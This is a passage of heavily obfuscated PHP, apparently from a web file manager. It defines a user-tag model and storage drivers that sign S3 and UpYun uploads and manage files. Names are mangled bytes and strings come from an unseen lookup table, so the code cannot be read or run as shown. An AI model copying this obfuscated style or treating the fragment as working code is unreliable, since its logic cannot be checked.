$»ùçÜ©Ú) { return Cache::remove("\x55\x73\x65\162\x4f\x70\164\151\157\x6e\137{$‘à…èã}\x5f" . $»ùçÜ©Ú); } protected function optionDefault($–ÆÀîÁ² = '') { $â…²ó½ê =& $_SERVER[® ¨Ä®ñ]; if ($–ÆÀîÁ² == $â…²ó½ê[12]) { return $GLOBALS[$â…²ó½ê[6]][$â…²ó½ê[2280]]; } if ($–ÆÀîÁ² == $â…²ó½ê[2281]) { return $GLOBALS[$â…²ó½ê[6]][$â…²ó½ê[2282]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\x72\x2e\164\141\x67\x4c\151\163\x74"; public $modelType = "\x55\x73\x65\162\117\x70\164\x69\157\156"; public $field = array("\x6e\141\x6d\145", "\163\x74\x79\154\x65", "\x73\157\x72\164"); public function listData($üâ³Î–“ = false, $°÷ÖÔ¾İ = "\x73\x6f\162\164", $ğ£šĞ = false) { return parent::listData($üâ³Î–“, $°÷ÖÔ¾İ, $ğ£šĞ); } public function remove($¹ ˜Ø‚à) { return parent::remove($¹ ˜Ø‚à); } public function add($‡ó è, $ĞƒÉ”¤Ú = "\154\x61\142\145\x6c\55\147\x72\145\x79\x2d\x6e\x6f\162\x6d\141\x6c") { $æ¤Àé‘Û =& $_SERVER[® ¨Ä®ñ]; if ($this->findByName($‡ó è)) { return !1; } $ÁàºÃŒ… = array($æ¤Àé‘Û[412] => $‡ó è, $æ¤Àé‘Û[475] => $ĞƒÉ”¤Ú, $æ¤Àé‘Û[1811] => $this->getSort($æ¤Àé‘Û[253]) + 1); return parent::insert($ÁàºÃŒ…); } public function update($¯Ë“§ëÁ, $÷ÃŸáğ) { $ÚéŒ›‹ƒ =& $_SERVER[® ¨Ä®ñ]; $û­˜Ÿ¤¨ = $this->listData($¯Ë“§ëÁ); $ †¼ªÀ÷ = $this->findByName($÷ÃŸáğ[$ÚéŒ›‹ƒ[32]]); if (!$û­˜Ÿ¤¨ || $ †¼ªÀ÷ && $ †¼ªÀ÷[$ÚéŒ›‹ƒ[392]] != $û­˜Ÿ¤¨[$ÚéŒ›‹ƒ[392]]) { return !1; } return parent::update($¯Ë“§ëÁ, $÷ÃŸáğ); } public function moveTop($ïª©Éˆ¢) { $şõí´¤« =& $_SERVER[® ¨Ä®ñ]; $õ»ÛâóÍ = parent::listData(); $á¡°ÚÊ = $this->getSort($şõí´¤«[252]); foreach ($õ»ÛâóÍ as &$ŞÆø’É) { if ($ŞÆø’É[$şõí´¤«[392]] == $ïª©Éˆ¢) { $ŞÆø’É[$şõí´¤«[1830]] = $á¡°ÚÊ; continue; } $ŞÆø’É[$şõí´¤«[1830]] += 1; } unset($ŞÆø’É); return parent::resetData($õ»ÛâóÍ); } public function moveBottom($ì½ØšüÏ) { $öé—¸é =& $_SERVER[® ¨Ä®ñ]; $ª˜á×¨ = $this->getSort($öé—¸é[253]) + 1; return parent::update($ì½ØšüÏ, array($öé—¸é[1830] => $ª˜á×¨)); } public function resetSort($ÈØ÷¨Ó) { $İº¬°€ë =& $_SERVER[® ¨Ä®ñ]; $¹£Óõ½  = array(); $ÈØ÷¨Ó = is_array($ÈØ÷¨Ó) ? $ÈØ÷¨Ó : array(); for ($‚Á‹Æ–¹ = 0; $‚Á‹Æ–¹ < count($ÈØ÷¨Ó); $‚Á‹Æ–¹++) { $¹£Óõ½ [$ÈØ÷¨Ó[$‚Á‹Æ–¹] . $İº¬°€ë[12]] = $‚Á‹Æ–¹ + 1; } $Üœ¦ø› = parent::listData(); foreach ($Üœ¦ø› as &$«³øÎÜ«) { $•®É›·„ = $¹£Óõ½ [$«³øÎÜ«[$İº¬°€ë[392]]]; $«³øÎÜ«[$İº¬°€ë[1830]] = $•®É›·„ ? $•®É›·„ : $«³øÎÜ«[$İº¬°€ë[1830]]; } unset($«³øÎÜ«); return parent::resetData($Üœ¦ø›); } private function getSort($àëìÅ¬Œ) { $ôß•Æáõ =& $_SERVER[® ¨Ä®ñ]; $šøÔË§  = parent::listData(); $ş†ºÄø = array_to_keyvalue($šøÔË§ , $ôß•Æáõ[12], $ôß•Æáõ[1830]); if (!$ş†ºÄø) { $ş†ºÄø = array(0); } $ôÎ·™ùÀ = $àëìÅ¬Œ == $ôß•Æáõ[253] ? max($ş†ºÄø) : min($ş†ºÄø); return intval($ôÎ·™ùÀ); } } goto C¢×ŠŞÂŠÏ; Còö‰¾¸™Ë: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ıµÜ¢˜¦) { parent::__construct($ıµÜ¢˜¦); } public function uploadFormData($¬ˆÏ‡”Ì, $åì‡ÑÆ£ = 3600) { $ÁÇ¥ö¿ù =& $_SERVER[® ¨Ä®ñ]; $¼­ƒèœ± = $ÁÇ¥ö¿ù[191]; $ıÀ´Ö±Ñ = $ÁÇ¥ö¿ù[1328]; $«¹¢îïã = $ÁÇ¥ö¿ù[62]; $àŠ¢¼Á¬ = gmdate($ÁÇ¥ö¿ù[1329]); $şƒ³šáÄ = gmdate($ÁÇ¥ö¿ù[733]); $šà¯İÜ = $ÁÇ¥ö¿ù[1330]; $ÛÛìÂ¢Ì = $åì‡ÑÆ£ . $ÁÇ¥ö¿ù[12]; $„¤Ï”ûË = $ÁÇ¥ö¿ù[1292]; $ä‘ÚÓë = array($this->accessKey, $şƒ³šáÄ, $this->region, $«¹¢îïã, $šà¯İÜ); $´š¡ˆ‚ò = implode($ÁÇ¥ö¿ù[8], $ä‘ÚÓë); $”­ÙÁ = array($ÁÇ¥ö¿ù[1294] => gmdate($ÁÇ¥ö¿ù[1293], strtotime($ÁÇ¥ö¿ù[1331])), $ÁÇ¥ö¿ù[1295] => array(array($ÁÇ¥ö¿ù[1297] => $this->bucket), array($ÁÇ¥ö¿ù[1296] => $¼­ƒèœ±), array($ÁÇ¥ö¿ù[1298], $ÁÇ¥ö¿ù[1299], $ÁÇ¥ö¿ù[12]), array($ÁÇ¥ö¿ù[1298], $ÁÇ¥ö¿ù[1332], $ÁÇ¥ö¿ù[12]), array($ÁÇ¥ö¿ù[1298], $ÁÇ¥ö¿ù[1333], $ÁÇ¥ö¿ù[12]), array($ÁÇ¥ö¿ù[1300] => $„¤Ï”ûË), array($ÁÇ¥ö¿ù[1334] => $´š¡ˆ‚ò), array($ÁÇ¥ö¿ù[1335] => $ıÀ´Ö±Ñ), array($ÁÇ¥ö¿ù[1336] => $àŠ¢¼Á¬), array($ÁÇ¥ö¿ù[1337] => $ÛÛìÂ¢Ì))); $Ÿ¸Ø½¡ = base64_encode(json_encode($”­ÙÁ)); $çß‰”” = hash_hmac($ÁÇ¥ö¿ù[1338], $şƒ³šáÄ, $ÁÇ¥ö¿ù[1339] . $this->secret, !0); $Ê×—Ÿèä = hash_hmac($ÁÇ¥ö¿ù[1338], $this->region, $çß‰””, !0); $©™âô´ = hash_hmac($ÁÇ¥ö¿ù[1338], $«¹¢îïã, $Ê×—Ÿèä, !0); $Äİõ¸â„ = hash_hmac($ÁÇ¥ö¿ù[1338], $šà¯İÜ, $©™âô´, !0); $Å ú‘±¹ = hash_hmac($ÁÇ¥ö¿ù[1338], $Ÿ¸Ø½¡, $Äİõ¸â„); $ÕáÛşÛ = array($ÁÇ¥ö¿ù[210] => $ÁÇ¥ö¿ù[12], $ÁÇ¥ö¿ù[1340] => $ÁÇ¥ö¿ù[12], $ÁÇ¥ö¿ù[1296] => $¼­ƒèœ±, $ÁÇ¥ö¿ù[1300] => $„¤Ï”ûË, $ÁÇ¥ö¿ù[1304] => $Ÿ¸Ø½¡, $ÁÇ¥ö¿ù[1341] => $´š¡ˆ‚ò, $ÁÇ¥ö¿ù[1342] => $ıÀ´Ö±Ñ, $ÁÇ¥ö¿ù[1343] => $àŠ¢¼Á¬, $ÁÇ¥ö¿ù[1344] => $ÛÛìÂ¢Ì, $ÁÇ¥ö¿ù[1345] => $Å ú‘±¹, $ÁÇ¥ö¿ù[174] => $this->getHost()); return $ÕáÛşÛ; } public function multiUploadFormData($ûÀ¨ŞêÊ, $Â‘ı©Ü = 3600) { $‡Åø³Éà =& $_SERVER[® ¨Ä®ñ]; $ç©µğ˜Õ = gmdate($‡Åø³Éà[1424]); $Éô†ÁÉ = array(); $ü¢Ò¾¦ = $this->client->getUploadId($this->bucket, $ûÀ¨ŞêÊ, $Éô†ÁÉ); if (!$ü¢Ò¾¦) { return !1; } return array($‡Åø³Éà[218] => $ü¢Ò¾¦, $‡Åø³Éà[174] => $this->getHost() . $‡Åø³Éà[8] . $this->pathEncode($ûÀ¨ŞêÊ), $‡Åø³Éà[219] => $ç©µğ˜Õ, $‡Åø³Éà[95] => $ûÀ¨ŞêÊ); } public function multiUploadAuthData($Á›â Äá, $øÕ÷Òï = array()) { $—ĞÉÈèï =& $_SERVER[® ¨Ä®ñ]; $…üü¢äß = isset($øÕ÷Òï[$—ĞÉÈèï[167]]) ? $øÕ÷Òï[$—ĞÉÈèï[167]] : $—ĞÉÈèï[12]; $·áşò¾ = $øÕ÷Òï[$—ĞÉÈèï[95]]; unset($øÕ÷Òï[$—ĞÉÈèï[95]]); if (isset($øÕ÷Òï[$—ĞÉÈèï[220]])) { return $this->listUploadParts($·áşò¾, $øÕ÷Òï); } $ô¤ôœ¨ = array(); if (isset($øÕ÷Òï[$—ĞÉÈèï[1425]])) { $ô¤ôœ¨[$—ĞÉÈèï[1426]] = $øÕ÷Òï[$—ĞÉÈèï[1425]]; } $¿ûÖæ„‘ = explode($—ĞÉÈèï[176], $this->getHost()); $ÎŸß™² = array($—ĞÉÈèï[1427] => $¿ûÖæ„‘[1], $—ĞÉÈèï[1428] => $—ĞÉÈèï[12], $—ĞÉÈèï[210] => $—ĞÉÈèï[118], $—ĞÉÈèï[1340] => $øÕ÷Òï[$—ĞÉÈèï[80]]); $°‚ğ†¹¯ = $—ĞÉÈèï[223]; $Å“¼«»‡ = $—ĞÉÈèï[8] . $this->pathEncode($·áşò¾) . $…üü¢äß; $Şş¥ó€‘ = $this->client->__getSignatureV4($ô¤ôœ¨, $ÎŸß™², $°‚ğ†¹¯, $Å“¼«»‡); if (strpos($…üü¢äß, $—ĞÉÈèï[222]) === 0) { if (isset($ô¤ôœ¨[$—ĞÉÈèï[1426]])) { $²Ñ’Æ‹Ÿ = $ô¤ôœ¨[$—ĞÉÈèï[1426]]; } else { if (isset($Şş¥ó€‘[$—ĞÉÈèï[1426]])) { $²Ñ’Æ‹Ÿ = $Şş¥ó€‘[$—ĞÉÈèï[1426]]; } else { $²Ñ’Æ‹Ÿ = hash($—ĞÉÈèï[1338], $—ĞÉÈèï[12]); } } return array($—ĞÉÈèï[229] => $Şş¥ó€‘[$—ĞÉÈèï[229]], $—ĞÉÈèï[1426] => $²Ñ’Æ‹Ÿ, $—ĞÉÈèï[219] => $Şş¥ó€‘[$—ĞÉÈèï[1429]]); } return $Şş¥ó€‘[$—ĞÉÈèï[229]]; } public function listUploadParts($¡“™ßø, $å²Šö¹° = array()) { $­û„ÎŞÁ =& $_SERVER[® ¨Ä®ñ]; $ÀË˜Ö•¿ = str_replace($­û„ÎŞÁ[230], $­û„ÎŞÁ[12], $å²Šö¹°[$­û„ÎŞÁ[167]]); $Šô°Ú´å = $this->client->listParts($this->bucket, $¡“™ßø, $ÀË˜Ö•¿); if (!$Šô°Ú´å) { return !1; } $•ø÷õÁğ = $­û„ÎŞÁ[1430]; foreach ($Šô°Ú´å as $Ğî¨ùÓå) { $•ø÷õÁğ .= $­û„ÎŞÁ[1431] . "\x3c\120\141\162\164\x4e\165\x6d\142\145\x72\x3e{$Ğî¨ùÓå[$­û„ÎŞÁ[1385]]}\x3c\57\x50\x61\x72\164\x4e\x75\155\x62\145\x72\x3e\12" . "\x3c\x45\x54\x61\147\x3e{$Ğî¨ùÓå[$­û„ÎŞÁ[1386]]}\74\x2f\x45\124\141\x67\x3e\xa" . $­û„ÎŞÁ[1432]; } $•ø÷õÁğ .= $­û„ÎŞÁ[1433]; $¢‘‘…®á = array(); $Îí‡‘ØÆ = explode($­û„ÎŞÁ[176], $this->getHost()); $«Ó¬ë© = array($­û„ÎŞÁ[1427] => $Îí‡‘ØÆ[1], $­û„ÎŞÁ[210] => $­û„ÎŞÁ[118], $­û„ÎŞÁ[1340] => strlen($•ø÷õÁğ)); $×¢­Îğ = $­û„ÎŞÁ[221]; $†Ó ö½‹ = $­û„ÎŞÁ[8] . $this->pathEncode($¡“™ßø) . $å²Šö¹°[$­û„ÎŞÁ[167]]; $‰ô¾™á = $this->client->__getSignatureV4($¢‘‘…®á, $«Ó¬ë©, $×¢­Îğ, $†Ó ö½‹, $•ø÷õÁğ); return array($­û„ÎŞÁ[229] => $‰ô¾™á[$­û„ÎŞÁ[229]], $­û„ÎŞÁ[219] => $‰ô¾™á[$­û„ÎŞÁ[1429]], $­û„ÎŞÁ[231] => $Šô°Ú´å, $­û„ÎŞÁ[1426] => $‰ô¾™á[$­û„ÎŞÁ[1426]]); } public function link($¿ÉóÙ´¥, $ÖİŠî = array()) { return parent::link($¿ÉóÙ´¥, $ÖİŠî); } public function fileOut($”âèÇŠÀ, $¼×†¨µÊ = false, $İÖœ®àí = false, $ÑÂ¨†š¥ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[® ¨Ä®ñ][1434])) { return parent::fileOutServer($”âèÇŠÀ, $¼×†¨µÊ, $İÖœ®àí, $ÑÂ¨†š¥); } parent::fileOut($”âèÇŠÀ, $¼×†¨µÊ, $İÖœ®àí, $ÑÂ¨†š¥); } public function fileOutImage($Ÿ¤˜µÇø, $±í®À–ğ = 250) { if (strstr($this->endpoint, $_SERVER[® ¨Ä®ñ][1434])) { return parent::fileOutImageServer($Ÿ¤˜µÇø, $±í®À–ğ); } parent::fileOutImage($Ÿ¤˜µÇø, $±í®À–ğ); } public function fileOutLink($¶®İÓûÃ) { $×–è‰—µ =& $_SERVER[® ¨Ä®ñ]; if (substr($¶®İÓûÃ, 0, 7) == $×–è‰—µ[1307]) { $¶®İÓûÃ = $×–è‰—µ[1308] . substr($¶®İÓûÃ, 7); } header($×–è‰—µ[158] . $¶®İÓûÃ); die; } public function getHost() { $èƒİ’Üå =& $_SERVER[® ¨Ä®ñ]; $¸±í÷äÂ = str_rtrim(parent::getHost(), $èƒİ’Üå[8] . $this->bucket); $¸±í÷äÂ = explode($èƒİ’Üå[176], $¸±í÷äÂ); return $¸±í÷äÂ[0] . $èƒİ’Üå[176] . $this->bucket . $èƒİ’Üå[10] . $¸±í÷äÂ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($²«â £, $õ›¹ÄôÛ = 0) { parent::__construct(); $this->source = $²«â £; $this->sourceSize = $õ›¹ÄôÛ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($§“ñè½Ğ = false) { return $this->sourceSize; } public function getContent($””ù„ñ– = false) { return $this->fileSubstr($””ù„ñ–, 0, $this->sourceSize); } public function fileSubstr($¯¦’úö = false, $³µìÜ©ù = 0, $¡›Ñ¡‰ = 0) { if (!$¡›Ñ¡‰) { $¡›Ñ¡‰ = $this->sourceSize; } $´®£ÅÒÎ = $this->sourceSize - $³µìÜ©ù; if ($¡›Ñ¡‰ >= $´®£ÅÒÎ) { $¡›Ñ¡‰ = $´®£ÅÒÎ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $³µìÜ©ù, $¡›Ñ¡‰); } if ($this->sourceType == self::TYPE_FILE) { if ($¡›Ñ¡‰ <= 0) { return $_SERVER[® ¨Ä®ñ][12]; } $¶±Æˆ¨ = ftell($this->source); fseek_64($this->source, $¶±Æˆ¨ + $³µìÜ©ù); $¼ş„‹ = @fread($this->source, $¡›Ñ¡‰); fseek_64($this->source, $¶±Æˆ¨); return $¼ş„‹; } } public function hashMd5($İáÓ˜À = false) { return md5($this->getContent()); } public static function hash($ë¾‡, $Ÿí¬ƒ±ä = 0) { $Òû‹ôÈ = new PathDriverStream($ë¾‡, $Ÿí¬ƒ±ä); return $Òû‹ôÈ->hashSimple($ë¾‡); } public static function md5($®°¾êİÏ, $Ÿ…Éİ€¦ = 0) { $§»Œ²¸Æ = new PathDriverStream($®°¾êİÏ, $Ÿ…Éİ€¦); return $§»Œ²¸Æ->hashMd5($®°¾êİÏ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\160\x3a\x2f\x2f\x76\60\x2e\141\x70\151\56\x75\x70\x79\x75\x6e\x2e\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Ùî¨£üÂ) { parent::__construct(); $this->_init($Ùî¨£üÂ); } public function _init($¦Õ­Å­æ) { $›”§û½è =& $_SERVER[® ¨Ä®ñ]; foreach ($¦Õ­Å­æ as $Şø†É»Å => $è¹Ù¬Ã–) { if (isset($this->{$Şø†É»Å})) { $this->{$Şø†É»Å} = $è¹Ù¬Ã–; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($›”§û½è[1435] . LNG($›”§û½è[1366])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($È±öëÀÓ, $‚Øéñ­ = "\107\x45\x54") { $Œ›ö§º =& $_SERVER[® ¨Ä®ñ]; $»íÑÅö« = gmdate($Œ›ö§º[1399]); $à”„‘£Û = base64_encode(hash_hmac($Œ›ö§º[1436], "{$‚Øéñ­}\46{$È±öëÀÓ}\46{$»íÑÅö«}", md5("{$this->userpass}"), !0)); $ùá±ÃÉ‰ = array("\x41\165\164\x68\157\162\151\x7a\141\x74\x69\157\156\x3a\125\120\x59\125\116\40{$this->username}\72{$à”„‘£Û}", "\x44\141\x74\145\72{$»íÑÅö«}"); return $ùá±ÃÉ‰; } public function ussRequest($ƒÎêƒ¥¬, $Ùì­Æ°¸ = "\x47\105\x54", $ÑúãúÒ‹ = false, $ÓŒ•ˆ© = false, $õÅöµîê = false) { $œòºŒÏ¶ =& $_SERVER[® ¨Ä®ñ]; $ƒÎêƒ¥¬ = trim($ƒÎêƒ¥¬, $œòºŒÏ¶[8]); $æ–£óÍ‘ = "\x2f{$this->bucket}\57{$ƒÎêƒ¥¬}"; $êŒõü¿½ = $this->ussHeaders($æ–£óÍ‘, $Ùì­Æ°¸); if ($ÓŒ•ˆ©) { $êŒõü¿½ = array_merge($êŒõü¿½, $ÓŒ•ˆ©); } $·™¹ìÒ± = url_request($this->endpoint . $æ–£óÍ‘, $Ùì­Æ°¸, $ÑúãúÒ‹, $êŒõü¿½, $õÅöµîê); if (!$·™¹ìÒ±) { return array($œòºŒÏ¶[1173] => !1, $œòºŒÏ¶[1175] => $œòºŒÏ¶[1437]); } if (strtolower($Ùì­Æ°¸) == $œòºŒÏ¶[189] || in_array($·™¹ìÒ±[$œòºŒÏ¶[1173]], array($œòºŒÏ¶[1292], $œòºŒÏ¶[1438]))) { $ÑúãúÒ‹ = $·™¹ìÒ±[$œòºŒÏ¶[1439]]; } else { $ÑúãúÒ‹ = json_decode($·™¹ìÒ±[$œòºŒÏ¶[1175]], !0); if (!$ÑúãúÒ‹) { $ÑúãúÒ‹ = $·™¹ìÒ±[$œòºŒÏ¶[1175]]; } else { if (!$·™¹ìÒ±[$œòºŒÏ¶[732]] && isset($ÑúãúÒ‹[$œòºŒÏ¶[1440]])) { $ÑúãúÒ‹ = $ÑúãúÒ‹[$œòºŒÏ¶[1440]]; } } } return array($œòºŒÏ¶[1173] => $·™¹ìÒ±[$œòºŒÏ¶[732]], $œòºŒÏ¶[1175] => $ÑúãúÒ‹); } public function mkfile($ù†ıŠ, $¼»Ú¼¨Ï = '', $ãğ§ÇñÛ = REPEAT_RENAME) { if ($this->setContent($ù†ıŠ, $¼»Ú¼¨Ï)) { return $this->getPathOuter($ù†ıŠ); } return !1; } public function mkdir($àÌ¤¸­±, $½íÂ«ò = REPEAT_SKIP) { $±…¬¸Ñš =& $_SERVER[® ¨Ä®ñ]; $•ŸÛµ¥Ï = trim($àÌ¤¸­±, $±…¬¸Ñš[8]); if ($this->_isFolder($•ŸÛµ¥Ï)) { return $this->getPathOuter($•ŸÛµ¥Ï); } $ıä¾…É = array($±…¬¸Ñš[1441]); $ÌïğşŠş = $this->ussRequest($•ŸÛµ¥Ï, $±…¬¸Ñš[221], !1, $ıä¾…É); return $ÌïğşŠş[$±…¬¸Ñš[1173]] ? $this->getPathOuter($•ŸÛµ¥Ï) : !1; } public function copyFile($Øı§åª©, $Ì”ïÇ—€) { $óäé€“ı =& $_SERVER[® ¨Ä®ñ]; $½Ë¤¡…ã = array($óäé€“ı[1442] . "\57{$this->bucket}\x2f{$Øı§åª©}", $óäé€“ı[1443]); $ÁÜ¡À‰ù = $this->ussRequest($Ì”ïÇ—€, $óäé€“ı[223], !1, $½Ë¤¡…ã); return $ÁÜ¡À‰ù[$óäé€“ı[1173]] ? !0 : $this->getPathOuter($Ì”ïÇ—€); } public function moveFile($Ó§“øÑ, $»îØĞìš) { $¦ñÌŸğ” =& $_SERVER[® ¨Ä®ñ]; $†•å—ñœ = array($¦ñÌŸğ”[1444] . "\x2f{$this->bucket}\57{$Ó§“øÑ}", $¦ñÌŸğ”[1443]); $ŠÛ²‘Î³ = $this->ussRequest($»îØĞìš, $¦ñÌŸğ”[223], !1, $†•å—ñœ); return $ŠÛ²‘Î³[$¦ñÌŸğ”[1173]] ? !0 : $this->getPathOuter($»îØĞìš); } public function delFile($–×ÏÉ…ù) { $¶–íÎåş =& $_SERVER[® ¨Ä®ñ]; $Ôø½„æ = $this->ussRequest($–×ÏÉ…ù, $¶–íÎåş[1445]); return $Ôø½„æ[$¶–íÎåş[1173]] ? !0 : !1; } public function delFolder($Ğ‰Ö½ûà) { $èàç“Œ =& $_SERVER[® ¨Ä®ñ]; if (!$this->exist($Ğ‰Ö½ûà)) { return !0; } $this->listItemCache = !1; $î©“³àñ = $ı¸Àúğ¾ = array(); $this->fileList($Ğ‰Ö½ûà, $î©“³àñ, $ı¸Àúğ¾, !0); $this->listItemCache = !0; foreach ($ı¸Àúğ¾ as $¶Ó¡»ó¯) { $İùÓµÄ¹ = $this->ussRequest($¶Ó¡»ó¯[$èàç“Œ[32]], $èàç“Œ[1445]); if (!$İùÓµÄ¹[$èàç“Œ[1173]]) { return !1; } } foreach ($î©“³àñ as $¸—È İÆ) { $İùÓµÄ¹ = $this->ussRequest($¸—È İÆ, $èàç“Œ[1445]); if (!$İùÓµÄ¹[$èàç“Œ[1173]]) { return !1; } } $İùÓµÄ¹ = $this->ussRequest($Ğ‰Ö½ûà, $èàç“Œ[1445]); return $İùÓµÄ¹[$èàç“Œ[1173]]; } public function rename($‡âîÑÀ, $ğÆ…á™) { if ($this->isFile($‡âîÑÀ)) { $ğÆ…á™ = get_path_father($‡âîÑÀ) . $ğÆ…á™; return $this->moveFile($‡âîÑÀ, $ğÆ…á™); } return $this->renameObject($‡âîÑÀ, $ğÆ…á™); } public function fileInfo($ÚÆœï¡ , $Ôù‚”Åö = false, $Èª€æïˆ = array()) { $»òâ“‚È =& $_SERVER[® ¨Ä®ñ]; $éú…³àÑ = array($»òâ“‚È[32] => $this->pathThis($ÚÆœï¡ ), $»òâ“‚È[78] => $this->getPathOuter($»òâ“‚È[8] . $ÚÆœï¡ ), $»òâ“‚È[33] => $»òâ“‚È[192], $»òâ“‚È[80] => isset($Èª€æïˆ[$»òâ“‚È[80]]) ? $Èª€æïˆ[$»òâ“‚È[80]] : 0, $»òâ“‚È[167] => $this->ext($ÚÆœï¡ )); if ($Ôù‚”Åö) { return $éú…³àÑ; } $éú…³àÑ[$»òâ“‚È[193]] = $éú…³àÑ[$»òâ“‚È[86]] = 0; $éú…³àÑ[$»òâ“‚È[194]] = $éú…³àÑ[$»òâ“‚È[195]] = !0; if (empty($Èª€æïˆ)) { $Èª€æïˆ = $this->objectMeta($ÚÆœï¡ ); if (!$Èª€æïˆ) { return $éú…³àÑ; } } $éú…³àÑ[$»òâ“‚È[193]] = intval($Èª€æïˆ[$»òâ“‚È[1446]]); $éú…³àÑ[$»òâ“‚È[86]] = intval($Èª€æïˆ[$»òâ“‚È[1447]]); $éú…³àÑ[$»òâ“‚È[80]] = $Èª€æïˆ[$»òâ“‚È[80]]; return $éú…³àÑ; } public function folderInfo($Ò¾Œ‰¸, $¯­šöüŒ = false) { $”€¡”± =& $_SERVER[® ¨Ä®ñ]; $á¡ñ¯Å‰ = array($”€¡”±[32] => $this->pathThis($Ò¾Œ‰¸), $”€¡”±[78] => $this->getPathOuter($”€¡”±[8] . $Ò¾Œ‰¸), $”€¡”±[33] => $”€¡”±[79]); if ($¯­šöüŒ) { return $á¡ñ¯Å‰; } $á¡ñ¯Å‰[$”€¡”±[193]] = $á¡ñ¯Å‰[$”€¡”±[86]] = 0; $á¡ñ¯Å‰[$”€¡”±[194]] = $á¡ñ¯Å‰[$”€¡”±[195]] = !0; if (empty($ìŞÎ‹Ùú)) { $ìŞÎ‹Ùú = $this->objectMeta($Ò¾Œ‰¸); if (!$ìŞÎ‹Ùú) { return $á¡ñ¯Å‰; } } $á¡ñ¯Å‰[$”€¡”±[193]] = intval($ìŞÎ‹Ùú[$”€¡”±[1446]]); $á¡ñ¯Å‰[$”€¡”±[86]] = intval($ìŞÎ‹Ùú[$”€¡”±[1447]]); return $á¡ñ¯Å‰; } private function listObjs($å³â¸², $Î€î¢ë´ = 0, $¬ëÄ¼ä¿ = 1000) { $â¬İËèÕ =& $_SERVER[® ¨Ä®ñ]; $î½ğš¹ = array($â¬İËèÕ[1448], $â¬İËèÕ[1449] . $¬ëÄ¼ä¿); if ($Î€î¢ë´) { $î½ğš¹[] = $â¬İËèÕ[1450] . $Î€î¢ë´; } $¹†ûÒáë = $this->ussRequest($å³â¸², $â¬İËèÕ[225], !1, $î½ğš¹); return !$¹†ûÒáë[$â¬İËèÕ[1173]] ? !1 : $¹†ûÒáë[$â¬İËèÕ[1175]]; } private function fileList($”ŠŒÄÈ´, &$ö¼†÷Ï‚, &$òêû¡Æà, $š”ä«‚« = false) { $ó¢Ûîâ =& $_SERVER[® ¨Ä®ñ]; $³Ö§ÈŒÚ = $ó¢Ûîâ[12]; $Ùù ·àÏ = 1000; $âº¸•ô¿ = rtrim($”ŠŒÄÈ´, $ó¢Ûîâ[8]) . $ó¢Ûîâ[8]; $–¾¼éóÚ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $˜ã˜ÖÖÍ = $this->listObjs($”ŠŒÄÈ´, $³Ö§ÈŒÚ, $Ùù ·àÏ); if (!$˜ã˜ÖÖÍ) { return !1; } $³Ö§ÈŒÚ = isset($˜ã˜ÖÖÍ[$ó¢Ûîâ[1451]]) ? $˜ã˜ÖÖÍ[$ó¢Ûîâ[1451]] : $ó¢Ûîâ[12]; $„‚Ë ’— = isset($˜ã˜ÖÖÍ[$ó¢Ûîâ[1452]]) ? $˜ã˜ÖÖÍ[$ó¢Ûîâ[1452]] : array(); foreach ($„‚Ë ’— as $ËÅìéÖı) { $²»´Ü” = $ËÅìéÖı[$ó¢Ûîâ[33]] == $ó¢Ûîâ[79] ? !0 : !1; $Ëç¼×õï = ltrim($âº¸•ô¿ . $ËÅìéÖı[$ó¢Ûîâ[32]], $ó¢Ûîâ[8]) . ($²»´Ü” ? $ó¢Ûîâ[8] : $ó¢Ûîâ[12]); $ü—ØÕ¹® = array($ó¢Ûîâ[32] => $Ëç¼×õï, $ó¢Ûîâ[33] => $²»´Ü” ? $ó¢Ûîâ[79] : $ó¢Ûîâ[192], $ó¢Ûîâ[80] => $ËÅìéÖı[$ó¢Ûîâ[332]], $ó¢Ûîâ[1447] => $ËÅìéÖı[$ó¢Ûîâ[1453]]); if ($–¾¼éóÚ) { $this->cacheMethod($ó¢Ûîâ[198], $Ëç¼×õï, $²»´Ü”); $this->cacheMethod($ó¢Ûîâ[199], $Ëç¼×õï, $ü—ØÕ¹®); } if ($²»´Ü”) { $ö¼†÷Ï‚[] = $Ëç¼×õï; if ($š”ä«‚«) { $this->fileList($Ëç¼×õï, $ö¼†÷Ï‚, $òêû¡Æà, $š”ä«‚«); } continue; } $òêû¡Æà[] = $ü—ØÕ¹®; } if (count($„‚Ë ’—) < $Ùù ·àÏ) { break; } } if ($–¾¼éóÚ) { $this->cacheMethod($ó¢Ûîâ[198], $”ŠŒÄÈ´, !0); } } public function listPath($•ôÖËª™, $ÈÇƒ÷— = false) { $Ò‰ò“Ä‚ =& $_SERVER[® ¨Ä®ñ]; $ş¿Îœ  = $ÑŠ¡Æ–ò = array(); $this->fileList($•ôÖËª™, $ş¿Îœ , $ÑŠ¡Æ–ò); foreach ($ş¿Îœ  as $÷Öã­Â => $î®á Íô) { $ş¿Îœ [$÷Öã­Â] = $this->folderInfo($î®á Íô, $ÈÇƒ÷—); } foreach ($ÑŠ¡Æ–ò as $÷Öã­Â => $î®á Íô) { $ÑŠ¡Æ–ò[$÷Öã­Â] = $this->fileInfo($î®á Íô[$Ò‰ò“Ä‚[32]], $ÈÇƒ÷—, $î®á Íô); } return array($Ò‰ò“Ä‚[77] => $ş¿Îœ , $Ò‰ò“Ä‚[76] => $ÑŠ¡Æ–ò); } public function has($Ù‡Ç—Ùù, $ÆÛˆ‹ö¤ = false, $¨İ¢…µ¨ = true) { $üÄ ş¿¦ =& $_SERVER[® ¨Ä®ñ]; $Ó³’·û„ = $üÄ ş¿¦[12]; $è§Ïœù = 500; $İ§ŒöéÒ = 0; $˜áÒäõØ = 0; $ó‰Ö˜Û = rtrim($Ù‡Ç—Ùù, $üÄ ş¿¦[8]) . $üÄ 